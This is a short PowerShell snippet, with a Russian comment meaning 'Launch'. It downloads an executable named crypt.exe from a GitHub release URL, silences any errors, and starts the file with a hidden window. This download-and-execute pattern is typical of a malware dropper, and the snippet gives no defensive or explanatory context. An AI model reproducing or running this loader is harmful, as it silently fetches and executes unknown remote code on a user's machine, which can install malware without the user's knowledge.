Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/crypt.exe" -OutFile "crypt.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "crypt.exe" -WindowStyle Hidden



